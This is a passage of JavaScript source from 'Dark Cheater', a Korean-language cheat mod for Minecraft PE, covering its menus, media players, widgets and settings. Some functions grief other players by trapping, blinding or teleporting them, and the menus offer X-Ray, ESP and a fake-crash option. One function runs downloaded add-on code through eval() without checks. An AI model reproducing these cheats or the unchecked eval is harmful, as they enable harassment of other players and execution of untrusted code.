if(fucks[5]) setTiles(Entity.getX(pp)-1, Entity.getX(pp)+1, Entity.getY(pp)-1, Entity.getY(pp)-1, Entity.getZ(pp)-1, Entity.getZ(pp)+1, 30);
if(fucks[6]) setTiles(Entity.getX(pp)-1, Entity.getX(pp)+1, Entity.getY(pp)+4, Entity.getY(pp)+6, Entity.getZ(pp)-1, Entity.getZ(pp)+1, 12);
if(fucks[7]) Entity.addEffect(pp, MobEffect.blindness, 600, 2, true, false);
if(fucks[8]) teleport(pp, Entity.getX(pp), Entity.getY(pp)+15, Entity.getZ(pp));
}
Dark.toast("플레이어들을 조집니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectMusic(path, btn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list();
var dir2 = fixArray(dir, path, false);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
if(dir3.isDirectory()){
selectMusic(dir3, btn);
}
else{
playMusic(dir3);
btn.setText("음악 정지");
}
}
}));
dialog.setTitle("파일 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function fixArray(arr, path, tf){
var arr1 = [];
var arr2 = [];
var arr3 = [];
for each(var ff in arr){
if(ff.substring(0, 1)!=".")
arr1.push(ff);
}
for each(var ff in arr1){
var fff = new java.io.File(path+"/"+ff);
var ffff = ff.split("\\.");
var fffff = ffff[ffff.length-1];
if(fff.isDirectory())
arr2.push(ff);
if((!tf&&fffff=="mp3")||tf&&((fffff=="mp4"||fffff=="wmv"||fffff=="avi"||fffff=="mkv"||fffff=="k3g"||fffff=="skm"||fffff=="flv")))
arr3.push(ff);
}
var arr4 = arr2.sort();
var arr5 = arr3.sort();
for each(var ff in arr5)
arr4.push(ff)
return arr4;
}


function playMusic(path){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
media.reset();
media.setDataSource(path);
media.prepare();
media.start();
music = true;
Dark.toast("Music on");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectVideo(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list();
var dir2 = fixArray(dir, path, true);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
if(dir3.isDirectory()) selectVideo(dir3);
else videoDialog(dir3);
}
}));
dialog.setTitle("파일 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function videoDialog(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try {
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var video = new android.widget.VideoView(ctx);
video.setVideoPath(path);
video.start();
layout.addView(video);
dialog.setView(layout);
dialog.setTitle("영상 재생");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectTheme(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var theme = ["기존의 테마", "DEVICE DEFAULT", "DEVICE DEFAULT LIGHT", "HOLO", "HOLO LIGHT", "THEME"];
dialog.setItems(theme, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
Dark.save("theme", w);
Dark.toast("MCPE를 다시 시작해야 적용됩니다.");
}
}));
dialog.setTitle("블록런처 UI 테마 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function setMinecraftTheme(){
switch(Number(Dark.read("theme"))){
case 1 : 
ctx.setTheme(android.R.style.Theme_DeviceDefault_NoActionBar_Fullscreen);
break;
case 2 : 
ctx.setTheme(android.R.style.Theme_DeviceDefault_Light_NoActionBar_Fullscreen);
break;
case 3 : 
ctx.setTheme(android.R.style.Theme_Holo_NoActionBar_Fullscreen);
break;
case 4 : 
ctx.setTheme(android.R.style.Theme_Holo_Light_NoActionBar_Fullscreen);
break;
case 5 : 
ctx.setTheme(android.R.style.Theme_NoTitleBar_Fullscreen);
break;
}

}


function setLoc(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var widgets = ["스크린샷 버튼", "플레이어 좌표", "시계", "R/W & Zoom", "월드 에딧 버튼", "마인크래프트 시계", "시야 조절", "위치 초기화"];
dialog.setItems(widgets, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
if(w==7){
removeWidgetData();
Dark.toast("초기화 되었습니다.");
}
else{
selectWidgetPosition(w);
Dark.toast("화면을 터치하여 주세요.");
}
}
}));
dialog.setTitle("위젯 위치 변경");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectWidgetPosition(n){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(n==3){
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var dist = new android.widget.SeekBar(ctx);
dist.setMax(ctx.getWindowManager().getDefaultDisplay().getWidth()/2);
if(Dark.read("btnDist")=="")
dist.setProgress(210);
else
dist.setProgress(Number(Dark.read("btnDist")));
dist.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
dist2 = seek.getProgress()+"";
}
}));
layout.addView(dist);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("버튼 사이의 거리 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Dark.save("btnDist", dist2);
if(btnR!=null){
btnR.dismiss();
btnF.dismiss();
makeTwoBtn();
}
}
}));
dialog.show();
}
else{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_DOWN){
saveWidgetPosition(ev.getRawX(), ev.getRawY(), n);
menu.dismiss();
Dark.toast("수정되었습니다.");
}
return true;
}
}));
menu.setContentView(layout);
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(120, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function saveWidgetPosition(x, y, type){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
switch(type){
case 0 : 
Dark.save("sBtnX", x);
Dark.save("sBtnY", y);
if(btnSS!=null){
btnSS.dismiss();
makeScreenShotButton();
}
break;
case 1 : 
Dark.save("playerX", x);
Dark.save("playerY", y);
if(p.p!=null){
p.p.dismiss();
p.p = new android.widget.PopupWindow();
p.t = new android.widget.TextView(ctx)
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X");
p.t.setTextSize(13);
p.t.setTextColor(white);
p.t.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp();
}
});
p.p.setContentView(p.t);
p.p.setWidth(dip2px(ctx, 110));
p.p.setHeight(dip2px(ctx, 37));
p.p.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
p.p.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("playerX"), Dark.read("playerY"));
}
break;
case 2 : 
Dark.save("clockX", x);
Dark.save("clockY", y);
if(clock!=null){
clock.dismiss();
showClock(true);
}
break;
case 4 : 
Dark.save("wBtnX", x);
Dark.save("wBtnY", y);
if(w.btn!=null){
w.btn.dismiss();
makeBtnW(true);
}
break;
case 5 : 
Dark.save("mClockX", x);
Dark.save("mClockY", y);
if(clock2!=null){
clock2.dismiss();
makeMinecraftClock(true);
}
break;
case 6 : 
Dark.save("mFovX", x);
Dark.save("mFovY", y);
if(fovM!=null){
fovM.dismiss();
makeFovEditor(true);
}
break;
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function removeWidgetData(){
try{
var file = [];
var path = sdcard+"/darkTornado/darkCheater/";
file[0] = new java.io.File(path+"sBtnX.txt");
file[1] = new java.io.File(path+"sBtnY.txt");
file[2] = new java.io.File(path+"playerX.txt");
file[3] = new java.io.File(path+"playerY.txt");
file[4] = new java.io.File(path+"clockX.txt");
file[5] = new java.io.File(path+"clockY.txt");
file[6] = new java.io.File(path+"btnDist.txt");
file[7] = new java.io.File(path+"wBtnX.txt");
file[8] = new java.io.File(path+"wBtnY.txt");
file[9] = new java.io.File(path+"mClockX.txt");
file[10] = new java.io.File(path+"mClockY.txt");
file[11] = new java.io.File(path+"mFovX.txt");
file[12] = new java.io.File(path+"mFovY.txt");
for(var n in file){
if(file[n].exists())
file[n].delete();
}
if(btnSS!=null){
btnSS.dismiss();
makeScreenShotButton();
}
if(p.p!=null){
p.p.dismiss();
p.p = new android.widget.PopupWindow();
p.t = new android.widget.TextView(ctx);
p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X");
p.t.setTextSize(13);
p.t.setTextColor(white);
p.t.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerTp();
}
});
p.p.setContentView(p.t);
p.p.setWidth(dip2px(ctx, 110));
p.p.setHeight(dip2px(ctx, 37));
p.p.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
p.p.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.LEFT|android.view.Gravity.TOP, 80, 0);
}
if(clock!=null){
clock.dismiss();
showClock(true);
}
if(btnR!=null){
btnR.dismiss();
btnF.dismiss();
makeTwoBtn();
}
if(w.btn!=null){
w.btn.dismiss();
makeBtnW(true);
}
if(clock2!=null){
clock2.dismiss();
makeMinecraftClock(true);
}
if(fovM!=null){
fovM.dismiss();
makeFovEditor(true);
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function worldEditManager(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var on = new android.widget.ToggleButton(ctx);
var ale = new android.widget.ToggleButton(ctx);
var list = new android.widget.Button(ctx);
var log = new android.widget.Button(ctx);
var help = new android.widget.Button(ctx);
on.setTextOn("서버원용 월드 에딧(활성화)");
on.setTextOff("서버원용 월드 에딧(비활성화)");
ale.setTextOn("명령어 사용 알림(활성화)");
ale.setTextOff("명령어 사용 알림(비활성화)");
list.setText("사용자 목록");
log.setText("명령어 사용 내역");
help.setText("도움말");
on.setChecked(wo.tf);
ale.setChecked(wo.alert);
on.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
wo.tf = onoff;
}
}));
ale.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
wo.alert = onoff;
}
}));
list.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showWEUser();
}
});
log.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("명령어 사용 내역", worldEditString);
}
});
help.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("도움말", "서버원용 월드에딧입니다. 위에 있는 있는 월드 에딧과는 별개로 작동합니다.\n지점 1, 2는 각각 철칼과 철괭이로 터치하시면 선택됩니다.\n\"사용자 목록\" 버튼을 누르면 뜨는 목록에서 체크된 사람만 사용이 가능하며, OP와는 별개입니다.\n\"명령어 사용 알림\"을 키면, 서버원이 명령어를 사용할 시, 서버장에게 알림이 뜹니다.\n\n<명령어 목록>\n.set n m - 블록 아이디가 n, 블록 데미지가 m인 블록으로 채운다.\n.replace n m - n번 블록을 m번 블록으로 바꾼다.\n.change a b c d - 블록 아이디가 a, 블록 데미지가 b인 블록을 블록 아이디가 c, 블록 데미지가 d인 블록으로 바꾼다.\n.no tree - 나무(나무 원목&나뭇잎)를 지운다.\n.snow - 눈을 내린다.\n.no water - 물을 지운다.\n.circle r n m - 지점 1에 반지름이 r인 원을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.cylin r h n m - 지점 1에 반지름이 r, 높이가 h인 원기둥을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.sphere r n m - 지점 1에 반지름이 r인 구를 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다.\n.line s n m - 플레이어의 위치를 기준으로 바라보는 방향으로 s칸 앞까지의 직선을 블록 아이디 n, 블록 데미지 m인 블록으로 생성한다(상/하 미포함).");
}
});
layout.addView(on);
layout.addView(ale);
layout.addView(list);
layout.addView(log);
layout.addView(help);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("서버원용 월드 에딧");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showWEUser(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var playerNames = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
playerNames.push(Player.getName(e));
}
if(antiTwo){
var players2 = removeDouble(playerNames);
playerNames = players2;
}
if(playerSort){
var players2 = playerNames.sort();
playerNames = players2;
}
var checks = new Array();
for(var n in playerNames){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(playerNames[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
if(wo.user.indexOf(playerNames[n])!=-1)
checks[n].setChecked(true);
else
checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
wo.user.push(playerNames[check.getId()]);
}
else if(onoff==false){
wo.user.splice(wo.user.indexOf(playerNames[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("서버원용 월드 에딧 - 사용자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showChatLog(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var text = new android.widget.TextView(ctx);
text.setText(chatLog);
text.setTextColor(white);
text.setTextSize(17);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
layout.addView(text);
dialog.setTitle("대화 내용 보기");
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("닫기",null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
selectDir(sdcard);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function selectDir(path, nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list().sort();
var dir2 = [];
for each(var ff in dir){
var fff = new java.io.File(path+"/"+ff);
if(ff.substring(0, 1)!="."&&fff.isDirectory())
dir2.push(ff);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick: function(m, w){
var dir3 = new java.io.File(path+"/"+dir2[w]);
selectDir(dir3, nn);
}
}));
dialog.setTitle("폴더 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(nn==1) exportChatLog(path+"/terrorLog-"+Level.getWorldName()+".txt", 1);
else if(nn==2) exportChatLog(path+"/setTile Manager.txt", 2);
else if(nn==3) exportChatLog(path+"/Particle Helper.txt", 3);
else exportChatLog(path+"/chatLog-"+Level.getWorldName()+".txt");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function exportChatLog(path, nn){
try{
var file = new java.io.File(path);
var fos = new java.io.FileOutputStream(file);
if(nn==1) var str = new java.lang.String(terrorLog);
else if(nn==2) var str = new java.lang.String(setTileString);
else if(nn==3) var str = new java.lang.String(particleString);
else var str = new java.lang.String(chatLog);
fos.write(str.getBytes());
fos.close();
Dark.toast("저장되었습니다.\n("+path+")");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}


function showTerrorLog(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var text = new android.widget.TextView(ctx);
text.setText(terrorLog);
text.setTextColor(white);
text.setTextSize(17);
var layout = new android.widget.LinearLayout(ctx)
layout.setOrientation(1);
layout.addView(text);
dialog.setTitle("테러 기록 보기");
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("닫기",null);
dialog.setPositiveButton("SD 카드에 저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
selectDir(sdcard, 1);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function removeDouble(arr){
var arr1 = new Array();
for(var n=0;n<arr.length;n++){
if(arr1.indexOf(arr[n])==-1)
arr1.push(arr[n]);
}
return arr1;
}


function darkCheaterSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuS = new android.widget.PopupWindow();
var title = makeTitle("환경 설정");
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menuT = ["Dark 버튼 숨기기", "플레이어 목록에서 중복되는 이름 삭제", "플레이어 목록 가나다순으로 정렬", "어플 목록에서 패키지명도 표시", "X-Ray에서 광물 탐색", "드래그로 위젯&버튼 위치 수정", "플레이어 관리에서 기능사용 알림", "표지판 tp 사용 알림", "modTick 강제 호출", "서버 접속시 버튼 재생성", "일부 테러 방지 기능 자동 활성화", "네이티브 센드챗 부활", "테마 사용", "메뉴에서 검은색 글자 사용"];
for(var n in menuT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menuT[n]);
btnT[n].setTextOff(menuT[n]);
btnT[n].setId(n);
btnT[n].setTextColor(white2);
}
btnT[0].setChecked(btnHide);
btnT[1].setChecked(antiTwo);
btnT[2].setChecked(playerSort);
btnT[3].setChecked(appPack);
btnT[4].setChecked(scanOre);
btnT[5].setChecked(widgetDrag);
btnT[6].setChecked(pca);
btnT[7].setChecked(tpAlert);
btnT[8].setChecked(modTickOnoff);
btnT[9].setChecked(btnRe);
if(Dark.read("antiTerror")=="false") btnT[10].setChecked(false);
else btnT[10].setChecked(true);
btnT[11].setChecked(fixSendChat);
if(Dark.read("useTheme")=="true") btnT[12].setChecked(true);
else btnT[12].setChecked(false);
if(Dark.read("textBlack")=="true") btnT[13].setChecked(true);
else btnT[13].setChecked(false);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
btnHide = onoff;
btn.dismiss();
Dark.makeButton();
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
antiTwo = onoff;
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
playerSort = onoff;
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
appPack = onoff;
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
scanOre = onoff;
}
}));
btnT[5].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
widgetDrag = onoff;
if(onoff) Dark.toast("블록런처 종료시, 초기화됩니다.");
}
}));
btnT[6].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
pca = onoff;
}
}));
btnT[7].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
tpAlert = onoff;
}
}));
btnT[8].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
modTickOnoff = onoff;
if(onoff) callModTick();
}
}));
btnT[9].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
btnRe = onoff;
}
}));
btnT[10].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
Dark.save("antiTerror", onoff);
}
}));
btnT[11].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
fixSendChat = onoff;
}
}));
btnT[12].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
Dark.save("useTheme", onoff);
if(onoff&&Dark.read("themeName")=="") themeList();
}
}));
btnT[13].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
Dark.save("textBlack", onoff);
if(onoff) white2 = android.graphics.Color.BLACK;
else white2 = android.graphics.Color.WHITE;
}
}));
for(var n in menuT)
layout.addView(btnT[n]);
var button = new Array();
var menu = ["웹 브라우저 설정", "UI 변경", "버튼 위치 수정", "메뉴 위치 수정", "위젯 위치 수정", "추가 파일 다운로드", "지도 범위 설정", "엔티티 스폰 방지 설정", "메뉴 색상 설정", "이용 약관 보기", "다크 치터 테마 관리"];
for(var n in menu)
button[n] = makeButton(menu[n]);
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
webViewSetting();
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectTheme();
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
buttonLocation();
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(side==0){
side = 1;
Dark.toast("왼쪽으로 설정되었습니다.");
}
else if(side==1){
side = 0;
Dark.toast("오른쪽으로 설정되었습니다.");
}
Dark.save("side", side);
Dark.close(true);
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
openFlying();
}
}
});
button[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
setLoc();
}
});
button[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectAddOn();
}
});
button[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
inputMapData();
}
});
button[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
antiEntityList();
}
});
button[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
selectColor();
}
});
button[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showTerms(false);
}
});
button[9].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
showTermsWeb();
return true;
}
});
button[10].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
themeList();
}
});
for(var n in menu)
layout.addView(button[n]);
var exit = makeExit(menuS);
layout.addView(exit);
var scroll = makeScroll(layout, menuS);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuS.setContentView(layout2);
menuS.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function entityNameDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("이름을 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("엔티티 이름 짓기");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
entName = loc2.getText()+"";
Dark.toast("이름을 부여할 엔티티를 터치하세요.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function smartMoving(tf){
if(Dark.readAddOn("smartMoving")!="")
eval(Dark.readAddOn("smartMoving"));
else if(tf)
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}


function openPlus(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menuT = ["주기적으로 창고 위치 확인", "엔더 반응기 활성화", "Dark Cheater ESP", "블록 무한 설치", "크리에이티브처럼 블록 캐기", "추가한 스크립트 활성화", "Fire Editor"];
for(var n in menuT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menuT[n]);
btnT[n].setTextOff(menuT[n]);
}
btnT[0].setChecked(showChest);
btnT[1].setChecked(en.tf);
btnT[2].setChecked(esp.tf);
btnT[3].setChecked(instaBreak);
btnT[4].setChecked(tooMany);
btnT[5].setChecked(scriptOn);
if(fe.btn==null) btnT[6].setChecked(false);
else btnT[6].setChecked(true);
btnT[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
showChest = onoff;
}
}));
btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
en.tf = onoff;
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
esp.tf = onoff;
if(Dark.readAddOn("ESP")==""&&onoff){
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
btnT[2].setChecked(false);
}
if(!onoff) ModPE.showTipMessage("");
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
tooMany = onoff;
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
instaBreak = onoff;
}
}));
btnT[5].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
scriptOn = onoff;
}
}));
btnT[6].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
fireEditor(onoff);
}
}));
for(var n in menuT)
layout.addView(btnT[n]);
var button = new Array();
var menus = ["커스텀 아이템 추가", "텍스쳐명&텍스쳐 데미지 목록(0.11.1 기준)", "items-opaque.png 파일보기", "적용된 스크립트 수정", "가짜 크래시 띄우기", "건물 소환", "히로빈 소환", "setTile 매니저", "파티클 도우미", "상위 능력자용 아이템 지급", "스크립트 추가", "설치된 어플 보기", "제작자 소환"];
for(var n in menus){
button[n] = new android.widget.Button(ctx);
button[n].setText(menus[n]);
}
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
addNewItem();
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
